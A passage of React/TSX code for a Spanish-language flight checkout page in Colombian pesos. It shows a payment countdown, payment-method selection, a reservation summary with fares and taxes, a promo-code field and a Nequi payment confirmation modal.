                    <div className="w-6 h-6 border-2 border-gray-400 rounded-full flex items-center justify-center">2</div>
                    <span>Confirmación</span>
                </div>
            </div> */}
            <div className="max-container p-4">
                <img src={progress} alt="" className="my-4 border border-black/20" />
                <div className="mt-8">
                    <div className="flex items-center gap-4 border rounded-md border-light">
                        <div className="hidden md:block shrink-0 border-r border-r-light p-4">
                            <div className="text-sm text-gray-600 mb-2">Tiempo para pagar:</div>
                            <div className="text-4xl text-center text-gray-900 flex items-start gap-2 mb-2">
                                <div>
                                    {String(timeLeft.minutes).padStart(2, "0")}{" "}
                                    <div className="text-sm text-gray-600">
                                        <div className="text-sm text-gray-600"> minutos</div>
                                    </div>
                                </div>
                                :
                                <div>
                                    {String(timeLeft.seconds).padStart(2, "0")}
                                    <div className="text-sm text-gray-600">
                                        <div className="text-sm text-gray-600"> segundos</div>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div className="w-full p-3">
                            <h4 className="font-medium text-primary flex items-center gap-2 text-xl">
                                <FaCheck className="text-green-600" /> Completa tu reservación y asegura tu viaje
                            </h4>
                            <p className="text-sm text-muted">
                                Guardaremos tu reservación durante 10 minutos con el localizador <span className="font-medium">133221757</span>.
                            </p>
                            <p className="text-sm text-muted">
                                Si necesitas ayuda llámanos al fijo <span className="text-red-400">601 743 66 20</span>
                            </p>
                        </div>
                    </div>
                </div>
                <div className=" grid lg:grid-cols-3 gap-5 mt-5">
                    <div className="lg:col-span-2 space-y-5 order-2 md:order-1 ">
                        <div className="flex items-center flex-wrap  gap-5">
                            {paymentMethods
                                .filter((method) => method.id !== "bancolombia")
                                .map((method) => (
                                <button
                                    key={method.id}
                                    className={` rounded-md  px-3 border  py-2 transition-all duration-200 text-left ${
                                        selectedMethod === method.id
                                            ? "bg-blue-50 border-blue-500   "
                                            : "border-gray-300 bg-white  hover:border-blue-300"
                                    }`}
                                    onClick={() => setSelectedMethod(method.id as PaymentMethod)}
                                >
                                    <div className="flex  items-center gap-2">
                                        <img src={method.img} alt="" className="h-7" />
                                        <span className="text-xs font-medium shrink-0">{method.label}</span>
                                    </div>
                                </button>
                            ))}
                        </div>

                        <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-6">{renderPaymentForm()}</div>
                    </div>
                    <div className="space-y-5 order-1 md:order-2">
                        <div className="border border-light rounded-md shadow-sm text-sm text-gray-800 ">
                            <div className="flex items-center border-light justify-between px-4 py-3 border-b">
                                <h2 className="text-[#d13100] font-semibold text-lg">Resumen de tu reservación</h2>
                                <FaChevronUp className="text-[#d13100] w-4 h-4" />
                            </div>

                            <div className="px-4 py-4 border-b border-light space-y-3">
                                <h3 className="font-bold text-base">
                                    Vuelo {searchInfo.origin?.code} - {searchInfo.destination?.code} para {flightCalculation.totalPassengers} {flightCalculation.totalPassengers === 1 ? "persona" : "personas"}
                                </h3>
                                <p className="font-medium text-sm text-gray-600">Vuelo de ida</p>

                                <div className="flex items-start gap-4">
                                    <img src={logo} alt="airline" className=" h-5 object-contain" />
                                    <div className="text-sm space-y-0.5">
                                        <p className="font-semibold">
                                            {searchInfo.origin?.name} &gt; {searchInfo.destination?.name} <span className="ml-2">{departureDate}</span>
                                        </p>
                                        <p className="text-gray-500">
                                            {selectedFlight?.departureTime ? formatTime(selectedFlight.departureTime) : "00:00"} - {selectedFlight?.arrivalTime ? formatTime(selectedFlight.arrivalTime) : "00:00"} - {selectedFlight?.direct ? "Sin paradas" : "Con paradas"}
                                        </p>
                                        <p className="text-gray-800 font-medium">
                                            Tarifa: <span className="uppercase">{selectedFlight?.fareType || "N/A"}</span>
                                        </p>
                                    </div>
                                </div>
                                
                                {/* Vuelo de regreso (si es roundtrip) */}
                                {flightCalculation.isRoundtrip && selectedReturnFlight && (
                                    <>
                                        <p className="font-medium text-sm text-gray-600 mt-4">Vuelo de regreso</p>
                                        <div className="flex items-start gap-4">
                                            <img src={logo} alt="airline" className=" h-5 object-contain" />
                                            <div className="text-sm space-y-0.5">
                                                <p className="font-semibold">
                                                    {searchInfo.destination?.name} &gt; {searchInfo.origin?.name} <span className="ml-2">{returnDate}</span>
                                                </p>
                                                <p className="text-gray-500">
                                                    {selectedReturnFlight.departureTime ? formatTime(selectedReturnFlight.departureTime) : "00:00"} - {selectedReturnFlight.arrivalTime ? formatTime(selectedReturnFlight.arrivalTime) : "00:00"} - {selectedReturnFlight.direct ? "Sin paradas" : "Con paradas"}
                                                </p>
                                                <p className="text-gray-800 font-medium">
                                                    Tarifa: <span className="uppercase">{selectedReturnFlight.fareType}</span>
                                                </p>
                                            </div>
                                        </div>
                                    </>
                                )}
                            </div>

                            <div className="px-4 py-3 border-b border-light bg-gray-50 text-sm">
                                <div className="flex justify-between py-1">
                                    <p>
                                                                            Vuelo {flightCalculation.isRoundtrip ? "ida y vuelta" : "ida"} {searchInfo.origin?.code} - {searchInfo.destination?.code} para {flightCalculation.totalPassengers} {flightCalculation.totalPassengers === 1 ? "persona" : "personas"}
                                </p>
                                <p className="font-medium">$ {flightCalculation.totalForAllPassengers.toLocaleString()} COP</p>
                                </div>
                                <div className="flex justify-between py-1">
                                    <p>Impuestos</p>
                                    <p className="font-medium">$ {taxesAndFees.toLocaleString()} COP</p>
                                </div>
                            </div>

                            <div className="px-4 py-4 bg-gray-50 text-base font-semibold flex justify-between">
                                <p>Total:</p>
                                <p className="text-black">$ {finalTotal.toLocaleString()} COP</p>
                            </div>
                        </div>

                        <div className="bg-white rounded-lg shadow-sm border border-gray-200">
                            <div
                                className="flex text-[#d13100] items-center border-light justify-between px-4 py-3 border-b"
                                onClick={() => setPromoExpanded(!promoExpanded)}
                            >
                                <h2 className="  text-lg"> Cupón o código promocional</h2>
                                <span className={`transform transition-transform ${promoExpanded ? "rotate-180" : ""}`}>
                                    <CgChevronDown className="size-6" />
                                </span>
                            </div>

                            {promoExpanded && (
                                <div className="p-4 flex items-center gap-2">
                                    <input type="text" placeholder="Ingresa tu código" className="w-full px-3 py-2 rounded-md border-light border" />
                                    <button className="border border-light py-2 px-3 rounded-md">Aplicar</button>
                                </div>
                            )}
                        </div>
                    </div>
                </div>
            </div>

            <PaymentFooter />
            {nequiModalOpen && (
                <div className="fixed inset-0 bg-black/50 z-50 flex items-center justify-center">
                    <div className="bg-white max-w-lg w-full mx-4 rounded-md shadow p-6">
                        <div className="flex items-center justify-between mb-4">
                            <h3 className="text-xl font-bold text-[#200020]">Pago con el botón Nequi</h3>
                        </div>
                        <div className="flex items-center justify-center mb-4">
                            <img src="/boton-nequ.gif" alt="Nequi" className="h-100 object-contain" />
                        </div>
                        <div className="text-sm text-gray-800 mb-4">
                            <div className="flex justify-between"><span>Celular:</span><span className="font-semibold">{nequiPhone}</span></div>
                            <div className="flex justify-between"><span>Total a pagar:</span><span className="font-semibold">$ {finalTotal.toLocaleString()} COP</span></div>
                        </div>
                        <div>
                            <p className="text-md text-[#200020] font-normal mb-5"><span className="text-lg text-[#DA0081] font-semibold">1.</span> Recibirás una <b>notificación</b> en tu celular para que entres a Nequi y <b>Apruebes</b> el pago</p>
                            <p className="text-md text-[#200020] font-normal mb-5"><span className="text-lg text-[#DA0081] font-semibold">2.</span> Ve a las <b>"Notificaciones"</b> (Campanita) de la app Nequi y en la solicitud de <b>"Pago pendiente"</b> escoge <b>"Acepta"</b></p>
                            <p className="text-md text-[#200020] font-normal mb-5"><span className="text-lg text-[#DA0081] font-semibold">3.</span> Revisa los datos de la compra y dale en <b>"Paga"</b></p>
                        </div>
                        <div className="mt-6 flex items-center justify-center gap-3">
                            <div className="h-5 w-5 rounded-full border-2 border-gray-300 border-t-[#DA0081] animate-spin"></div>
                            <span className="text-sm text-gray-700">Esperando confirmación del pago</span>
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
};

export default PaymentInterface;
